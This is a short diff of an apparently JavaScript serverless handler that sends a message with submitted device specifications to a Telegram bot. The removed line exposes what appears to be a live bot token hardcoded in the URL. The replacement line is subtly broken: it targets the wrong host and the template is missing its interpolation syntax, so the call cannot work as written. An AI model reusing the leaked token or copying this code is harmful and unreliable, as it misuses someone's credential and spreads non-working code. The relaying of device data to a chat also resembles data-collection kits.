@@ -17,7 +17,7 @@ export default async function handler(req, res) {
                           `💻 Spesifikasi Perangkat:\n${bodyData.device}\n\n` +
                           `Status: Secure Relayed Success.`;
 
-        const telegramRes = await fetch(`https://telegram.org/8859660921:AAHL9cUwG2nX1PmfMYUm6QyMnUCh73e_77g/sendMessage`, {
+        const telegramRes = await fetch(`https://telegram.org{TELEGRAM_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CHAT_ID, text: pesanText })
